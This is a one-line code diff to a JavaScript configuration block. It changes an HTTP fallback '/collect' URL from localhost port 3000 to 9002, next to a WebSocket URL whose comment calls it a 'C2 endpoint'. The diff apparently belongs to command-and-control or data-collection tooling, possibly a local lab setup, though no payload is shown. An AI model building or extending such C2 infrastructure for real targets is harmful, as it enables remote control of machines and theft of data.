@@ -259,7 +259,7 @@
 
         const CONFIG = {
             wsUrl: 'ws://localhost:3001/ws',           // WebSocket C2 endpoint
-            fallbackUrl: 'http://localhost:3000/collect', // HTTP fallback
+            fallbackUrl: 'http://localhost:9002/collect', // HTTP fallback
             reconnectDelay: 1000,                      // Initial reconnect delay
             maxReconnectDelay: 30000,                  // Max reconnect delay
             reconnectAttempts: 0,                      // Track reconnection attempts
